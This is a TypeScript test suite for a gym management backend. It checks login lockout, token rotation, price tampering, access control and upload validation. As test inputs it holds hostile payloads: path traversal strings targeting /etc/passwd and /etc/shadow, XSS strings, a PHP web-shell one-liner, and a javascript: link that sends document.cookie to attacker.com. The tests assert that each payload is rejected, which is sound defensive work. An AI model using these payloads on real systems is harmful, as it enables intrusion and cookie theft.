import { describe, it, expect, beforeEach } from 'vitest';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { db } from '../database/db';
import { AuthService } from '../services/authService';
import { PriceService } from '../services/priceService';
import { TransactionService } from '../services/transactionService';
import { SecurityHealthService } from '../services/securityHealthService';
import { maskPhoneNumber, maskEmail, sanitizeAuditData } from '../services/auditService';
import { JWT_SECRET, REFRESH_TOKEN_SECRET } from '../middleware/auth';
import {
  antiPathTraversalMiddleware,
  sanitizeString,
  sanitizeObject,
  corsOptions
} from '../middleware/security';
import { requireRoles, requireMemberOwnershipOrStaff } from '../middleware/rbac';
import {
  verifyImageMagicBytes,
  saveImageFile,
  resolveStoredFilePath,
  ALLOWED_CATEGORIES
} from '../services/storageService';

describe('Layered Security & Anti-Hacking Test Suite (TDD)', () => {
  beforeEach(() => {
    // Reset test state for test user
    const testAdmin = db.users.get('usr-admin-001');
    if (testAdmin) {
      testAdmin.failedLoginAttempts = 0;
      testAdmin.lockedUntil = null;
      testAdmin.status = 'ACTIVE';
    }
  });

  describe('1. Password Security (Bcrypt & Minimum Strength)', () => {
    it('should hash passwords using bcrypt with salt rounds >= 10', () => {
      const plain = 'SecretPassword123!';
      const hash = bcrypt.hashSync(plain, 10);
      expect(hash).not.toBe(plain);
      expect(hash.startsWith('$2a$') || hash.startsWith('$2b$')).toBe(true);
      expect(bcrypt.compareSync(plain, hash)).toBe(true);
      expect(bcrypt.compareSync('WrongPass', hash)).toBe(false);
    });

    it('should reject weak passwords in changePassword', async () => {
      await expect(
        AuthService.changePassword('usr-admin-001', 'Admin123!', 'short')
      ).rejects.toThrow(/minimal 8 karakter/);

      await expect(
        AuthService.changePassword('usr-admin-001', 'Admin123!', 'onlyletters')
      ).rejects.toThrow(/kombinasi huruf dan angka/);
    });
  });

  describe('2. Login Security, Brute Force & Account Lockout', () => {
    it('should authenticate valid credentials and issue 15m access token & 7d refresh token', async () => {
      const result = await AuthService.login('admin', 'Admin123!');
      expect(result.accessToken).toBeDefined();
      expect(result.refreshToken).toBeDefined();
      expect(result.user.username).toBe('admin');
      expect(result.user.role).toBe('ADMIN');

      // Verify token decoded claims
      const decodedAccess = jwt.verify(result.accessToken, JWT_SECRET) as any;
      expect(decodedAccess.userId).toBe('usr-admin-001');
      expect(decodedAccess.role).toBe('ADMIN');

      const decodedRefresh = jwt.verify(result.refreshToken, REFRESH_TOKEN_SECRET) as any;
      expect(decodedRefresh.userId).toBe('usr-admin-001');
    });

    it('should never leak username existence in failed login response', async () => {
      await expect(
        AuthService.login('nonexistent_user_xyz@test.com', 'RandomPassword123!')
      ).rejects.toThrow('Username atau password salah.');
    });

    it('should lock account for 15 minutes after 5 consecutive failed attempts', async () => {
      const user = db.users.get('usr-admin-001')!;
      user.failedLoginAttempts = 0;
      user.lockedUntil = null;

      // 4 failed attempts
      for (let i = 1; i <= 4; i++) {
        await expect(AuthService.login('admin', 'WrongPass')).rejects.toThrow('Username atau password salah.');
        expect(user.failedLoginAttempts).toBe(i);
      }

      // 5th failed attempt triggers temporary lockout
      await expect(AuthService.login('admin', 'WrongPass')).rejects.toThrow(/dikunci sementara/);
      expect(user.lockedUntil).not.toBeNull();
      expect(new Date(user.lockedUntil!).getTime()).toBeGreaterThan(Date.now());

      // Attempting login with correct password during lockout must still be blocked
      await expect(AuthService.login('admin', 'Admin123!')).rejects.toThrow(/Akun sementara dikunci/);
    });
  });

  describe('3. Refresh Token Rotation & Token Reuse Detection', () => {
    it('should rotate refresh token and revoke old token on refresh', async () => {
      const initial = await AuthService.login('admin', 'Admin123!');
      const rotated = await AuthService.refreshTokens(initial.refreshToken);

      expect(rotated.accessToken).toBeDefined();
      expect(rotated.refreshToken).toBeDefined();
      expect(rotated.refreshToken).not.toBe(initial.refreshToken);

      // Attempting to reuse old refresh token should be rejected (Token Reuse Attack Detection)
      await expect(AuthService.refreshTokens(initial.refreshToken)).rejects.toThrow();
    });
  });

  describe('4. Price Tamper Protection & Official Server Calculation', () => {
    it('should calculate official total strictly from backend DB packages', () => {
      const calc = PriceService.calculateOfficialTotal([
        { packageId: 'PKG-01', quantity: 2 } // 350,000 * 2 = 700,000
      ]);

      expect(calc.subtotal).toBe(700000);
      expect(calc.total).toBe(700000);
    });

    it('should detect and reject price tampering when frontend sends manipulated amount', () => {
      expect(() => {
        PriceService.calculateOfficialTotal(
          [{ packageId: 'PKG-01', quantity: 1 }], // Official is 350,000
          undefined,
          1000 // Hacker claims 1,000
        );
      }).toThrow(/Integritas harga gagal/);
    });

    it('should validate official discount vouchers on server side only', () => {
      const calc = PriceService.calculateOfficialTotal(
        [{ packageId: 'PKG-06', quantity: 1 }], // 1,450,000
        'FITPRO10' // 10% discount
      );
      expect(calc.discountAmount).toBe(145000);
      expect(calc.total).toBe(1305000);
    });
  });

  describe('5. Transaction Security, Void & Daily Closing Protection', () => {
    it('should complete transactional checkout with official pricing', async () => {
      const trx = await TransactionService.checkout({
        memberId: 'MEM-001',
        items: [{ packageId: 'PKG-03', quantity: 1 }],
        paymentMethod: 'QRIS',
        cashierId: 'usr-kasir-001'
      });

      expect(trx.invoiceNumber).toContain('INV-');
      expect(trx.total).toBe(850000);
      expect(trx.status).toBe('PAID');
      expect(trx.isVoided).toBe(false);
    });

    it('should forbid unauthorized users from voiding transactions', async () => {
      const trx = await TransactionService.checkout({
        items: [{ packageId: 'PKG-01', quantity: 1 }],
        paymentMethod: 'CASH',
        cashierId: 'usr-kasir-001'
      });

      // Cashier role is not authorized to void
      await expect(
        TransactionService.voidTransaction({
          transactionId: trx.id,
          reason: 'Customer cancelled',
          authorizedUserId: 'usr-kasir-001',
          authorizedUserRole: 'KASIR'
        })
      ).rejects.toThrow(/memerlukan otorisasi/);
    });

    it('should allow ADMIN or LEADER to void with valid reason', async () => {
      const trx = await TransactionService.checkout({
        items: [{ packageId: 'PKG-01', quantity: 1 }],
        paymentMethod: 'CASH',
        cashierId: 'usr-kasir-001'
      });

      const voided = await TransactionService.voidTransaction({
        transactionId: trx.id,
        reason: 'Salah input paket oleh kasir',
        authorizedUserId: 'usr-admin-001',
        authorizedUserRole: 'ADMIN'
      });

      expect(voided.isVoided).toBe(true);
      expect(voided.status).toBe('VOIDED');
      expect(voided.voidReason).toBe('Salah input paket oleh kasir');
    });

    it('should protect closed daily batches from voiding', async () => {
      const trx = await TransactionService.checkout({
        items: [{ packageId: 'PKG-01', quantity: 1 }],
        paymentMethod: 'CASH',
        cashierId: 'usr-kasir-001'
      });

      // Simulate transaction assigned to closed daily batch
      trx.closingId = 'CLOSE-BATCH-2026-10-01';

      await expect(
        TransactionService.voidTransaction({
          transactionId: trx.id,
          reason: 'Attempt void after closing',
          authorizedUserId: 'usr-admin-001',
          authorizedUserRole: 'ADMIN'
        })
      ).rejects.toThrow(/Daily Closing/);
    });
  });

  describe('6. Sensitive Data Masking & Audit Logging', () => {
    it('should mask phone numbers in audit and security logs', () => {
      expect(maskPhoneNumber('081234567890')).toBe('0812****7890');
      expect(maskPhoneNumber('081999887766')).toBe('0819****7766');
    });

    it('should mask email addresses in audit logs', () => {
      expect(maskEmail('john.doe@example.com')).toBe('j***e@example.com');
      expect(maskEmail('nadia@gmail.com')).toBe('n***a@gmail.com');
    });

    it('should redact sensitive password and secret fields from audit logs', () => {
      const sanitized = sanitizeAuditData({
        username: 'budi',
        password: 'PlainTextPassword123!',
        token: 'eyJhbGciOi...',
        phone: '081234567890'
      });

      expect(sanitized).not.toContain('PlainTextPassword123!');
      expect(sanitized).toContain('[REDACTED_SECRET]');
      expect(sanitized).toContain('0812****7890');
    });
  });

  describe('7. Security Health & Automated Backup System', () => {
    it('should generate comprehensive security health status', () => {
      const report = SecurityHealthService.getHealthReport(true);
      expect(report.security.jwtConfigured).toBe(true);
      expect(report.security.rbacActive).toBe(true);
      expect(report.security.rateLimitingActive).toBe(true);
      expect(report.metrics.totalUsers).toBeGreaterThan(0);
    });

    it('should trigger automated backup with SHA-256 integrity checksum', () => {
      const backup = SecurityHealthService.triggerBackup();
      expect(backup.filename).toContain('gympro_backup_');
      expect(backup.checksum).toHaveLength(64); // SHA-256
      expect(backup.status).toBe('COMPLETED');
    });
  });

  describe('8. Anti-Path-Traversal, Null-Byte & Encoding Manipulations', () => {
    it('should block classic path traversal ../', () => {
      let blocked = false;
      const req: any = { url: '/api/files/../../etc/passwd', path: '/api/files/../../etc/passwd' };
      const res: any = {
        status: (code: number) => {
          if (code === 400) blocked = true;
          return { json: () => {} };
        }
      };
      antiPathTraversalMiddleware(req, res, () => {});
      expect(blocked).toBe(true);
    });

    it('should block URL encoded path traversal %2e%2e%2f and double encoded %252e%252e%252f', () => {
      let blockedEncoded = false;
      let blockedDoubleEncoded = false;

      const req1: any = { url: '/uploads/%2e%2e%2fconfig.json', path: '/uploads/%2e%2e%2fconfig.json' };
      const res1: any = {
        status: (code: number) => {
          if (code === 400) blockedEncoded = true;
          return { json: () => {} };
        }
      };
      antiPathTraversalMiddleware(req1, res1, () => {});
      expect(blockedEncoded).toBe(true);

      const req2: any = { url: '/uploads/%252e%252e%252fsecret.env', path: '/uploads/%252e%252e%252fsecret.env' };
      const res2: any = {
        status: (code: number) => {
          if (code === 400) blockedDoubleEncoded = true;
          return { json: () => {} };
        }
      };
      antiPathTraversalMiddleware(req2, res2, () => {});
      expect(blockedDoubleEncoded).toBe(true);
    });

    it('should block null byte poisoning attempts (%00 or \\0)', () => {
      let blocked = false;
      const req: any = { url: '/uploads/image.png%00.php', path: '/uploads/image.png%00.php' };
      const res: any = {
        status: (code: number) => {
          if (code === 400) blocked = true;
          return { json: () => {} };
        }
      };
      antiPathTraversalMiddleware(req, res, () => {});
      expect(blocked).toBe(true);
    });

    it('should allow legitimate clean URLs', () => {
      let passed = false;
      const req: any = { url: '/api/members?branchId=BR-001', path: '/api/members' };
      const res: any = { status: () => ({ json: () => {} }) };
      antiPathTraversalMiddleware(req, res, () => { passed = true; });
      expect(passed).toBe(true);
    });
  });

  describe('9. XSS Input Sanitization', () => {
    it('should strip <script> tags and malicious inline javascript event handlers', () => {
      const malicious = '<script>alert("XSS")</script>Nadia Paramitha<img src=x onerror=alert(1)>';
      const clean = sanitizeString(malicious);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('alert("XSS")');
      expect(clean).not.toContain('onerror=');
      expect(clean).toContain('Nadia Paramitha');
    });

    it('should strip javascript: pseudoprotocol links', () => {
      const link = 'javascript:fetch("https://attacker.com/steal?cookie="+document.cookie)';
      const clean = sanitizeString(link);
      expect(clean).not.toContain('javascript:');
    });

    it('should recursively sanitize deeply nested request payloads', () => {
      const payload = {
        name: 'Dimas <script>evil()</script>',
        metadata: {
          notes: 'Catatan biaya <b onclick="attack()">klik</b>',
          tags: ['fitness', '<img src=x onload=pwn()>']
        }
      };

      const sanitized: any = sanitizeObject(payload);
      expect(sanitized.name).toBe('Dimas ');
      expect(sanitized.metadata.notes).not.toContain('onclick=');
      expect(sanitized.metadata.tags[1]).not.toContain('onload=');
    });
  });

  describe('10. Financial Expense Authorization & Overpayment Protection', () => {
    it('should enforce role checks on expense operations', () => {
      let memberForbidden = false;
      const reqMember: any = {
        user: { userId: 'usr-member-001', role: 'MEMBER', username: 'member_nadia' }
      };
      const res: any = {
        status: (code: number) => {
          if (code === 403) memberForbidden = true;
          return { json: () => {} };
        }
      };

      const expenseRbac = requireRoles(['ADMIN', 'LEADER', 'KARYAWAN', 'KASIR']);
      expenseRbac(reqMember, res, () => {});
      expect(memberForbidden).toBe(true);
    });

    it('should allow authorized staff (KASIR, LEADER, ADMIN) to access expenses', () => {
      let allowed = false;
      const reqKasir: any = {
        user: { userId: 'usr-kasir-001', role: 'KASIR', username: 'kasir_dina' }
      };
      const res: any = { status: () => ({ json: () => {} }) };

      const expenseRbac = requireRoles(['ADMIN', 'LEADER', 'KARYAWAN', 'KASIR']);
      expenseRbac(reqKasir, res, () => { allowed = true; });
      expect(allowed).toBe(true);
    });
  });

  describe('11. CORS Origin Whitelist Enforcement', () => {
    it('should permit authorized origins and Google Cloud Run / AI Studio subdomains', () => {
      let allowed = false;
      (corsOptions.origin as any)('https://gympro-production.run.app', (err: any, ok: boolean) => {
        if (!err && ok) allowed = true;
      });
      expect(allowed).toBe(true);
    });

    it('should reject unauthorized third-party origins', () => {
      let rejected = false;
      (corsOptions.origin as any)('https://malicious-gym-hacker.com', (err: any) => {
        if (err && err.message.includes('not authorized')) rejected = true;
      });
      expect(rejected).toBe(true);
    });
  });

  describe('12. IDOR & Object-Level Access Control (Member & Trainer Records)', () => {
    it('should prevent Member A from viewing Member B profile (Anti-IDOR)', () => {
      let idorBlocked = false;
      const reqMember: any = {
        user: { userId: 'usr-member-001', role: 'MEMBER', username: 'member_nadia', email: 'nadia.paramitha@gmail.com' },
        params: { id: 'MEM-002' } // Attempting to access Dimas Anggara
      };
      const res: any = {
        status: (code: number) => {
          if (code === 403) idorBlocked = true;
          return { json: () => {} };
        }
      };

      requireMemberOwnershipOrStaff(reqMember, res, () => {});
      expect(idorBlocked).toBe(true);
    });

    it('should allow Member to view their own profile', () => {
      let allowed = false;
      const reqMember: any = {
        user: { userId: 'usr-member-001', role: 'MEMBER', username: 'member_nadia', email: 'nadia.paramitha@gmail.com' },
        params: { id: 'MEM-001' } // Nadia's own record
      };
      const res: any = { status: () => ({ json: () => {} }) };

      requireMemberOwnershipOrStaff(reqMember, res, () => { allowed = true; });
      expect(allowed).toBe(true);
    });

    it('should allow Trainer to access assigned member but block unassigned member', () => {
      // Setup member assignment
      const m1 = db.members.get('MEM-001')!;
      m1.assignedTrainerId = 'usr-trainer-001';

      const m2 = db.members.get('MEM-002')!;
      m2.assignedTrainerId = 'usr-trainer-999'; // Not Coach Reza

      let assignedAllowed = false;
      const reqAssigned: any = {
        user: { userId: 'usr-trainer-001', role: 'TRAINER', username: 'coach_reza' },
        params: { id: 'MEM-001' }
      };
      const res1: any = { status: () => ({ json: () => {} }) };
      requireMemberOwnershipOrStaff(reqAssigned, res1, () => { assignedAllowed = true; });
      expect(assignedAllowed).toBe(true);

      let unassignedBlocked = false;
      const reqUnassigned: any = {
        user: { userId: 'usr-trainer-001', role: 'TRAINER', username: 'coach_reza' },
        params: { id: 'MEM-002' }
      };
      const res2: any = {
        status: (code: number) => {
          if (code === 403) unassignedBlocked = true;
          return { json: () => {} };
        }
      };
      requireMemberOwnershipOrStaff(reqUnassigned, res2, () => {});
      expect(unassignedBlocked).toBe(true);
    });
  });

  describe('13. Persistent Photo Storage, Magic Bytes & Anti-Traversal Upload Validation', () => {
    it('should correctly identify valid image magic bytes for JPEG, PNG, and WebP', () => {
      // JPEG magic bytes: FF D8 FF
      const jpegBuf = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]);
      const jpegRes = verifyImageMagicBytes(jpegBuf);
      expect(jpegRes.isValid).toBe(true);
      expect(jpegRes.mimeType).toBe('image/jpeg');

      // PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A
      const pngBuf = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d]);
      const pngRes = verifyImageMagicBytes(pngBuf);
      expect(pngRes.isValid).toBe(true);
      expect(pngRes.mimeType).toBe('image/png');

      // WebP magic bytes: RIFF....WEBP
      const webpBuf = Buffer.from('RIFF\x24\x00\x00\x00WEBPVP8 \x18\x00\x00\x00', 'binary');
      const webpRes = verifyImageMagicBytes(webpBuf);
      expect(webpRes.isValid).toBe(true);
      expect(webpRes.mimeType).toBe('image/webp');
    });

    it('should reject fake files or malicious scripts masquerading as images', () => {
      const phpScript = Buffer.from('<?php system($_GET["cmd"]); ?>');
      const fakeRes = verifyImageMagicBytes(phpScript);
      expect(fakeRes.isValid).toBe(false);
      expect(fakeRes.mimeType).toBeNull();

      const htmlPayload = Buffer.from('<html><script>alert(1)</script></html>');
      const htmlRes = verifyImageMagicBytes(htmlPayload);
      expect(htmlRes.isValid).toBe(false);
      expect(htmlRes.mimeType).toBeNull();
    });

    it('should reject file uploads exceeding the 5MB size limit', async () => {
      const oversizeBuf = Buffer.alloc(5 * 1024 * 1024 + 1024);
      oversizeBuf[0] = 0xff;
      oversizeBuf[1] = 0xd8;
      oversizeBuf[2] = 0xff;

      await expect(
        saveImageFile(oversizeBuf, 'members')
      ).rejects.toThrow(/melebihi batas 5MB/);
    });

    it('should reject invalid or manipulated upload categories', async () => {
      const validJpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]);
      await expect(
        saveImageFile(validJpeg, 'malicious_cat' as any)
      ).rejects.toThrow(/Kategori penyimpanan tidak valid/);
    });

    it('should save valid image to persistent storage and return clean safe URL', async () => {
      const validJpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]);
      const res = await saveImageFile(validJpeg, 'members', 'profile.jpg');

      expect(res.category).toBe('members');
      expect(res.url).toMatch(/^\/uploads\/members\/members-[a-f0-9-]+\.jpg$/);
      expect(res.sizeBytes).toBe(validJpeg.length);
      expect(res.mimeType).toBe('image/jpeg');
    });

    it('should prevent path traversal attempts in resolveStoredFilePath', () => {
      expect(resolveStoredFilePath('members', '../../etc/passwd')).toBeNull();
      expect(resolveStoredFilePath('members', '..\\windows\\win.ini')).toBeNull();
      expect(resolveStoredFilePath('members', 'sub/../../etc/shadow')).toBeNull();
      expect(resolveStoredFilePath('invalid_cat', 'test.jpg')).toBeNull();
    });
  });
});
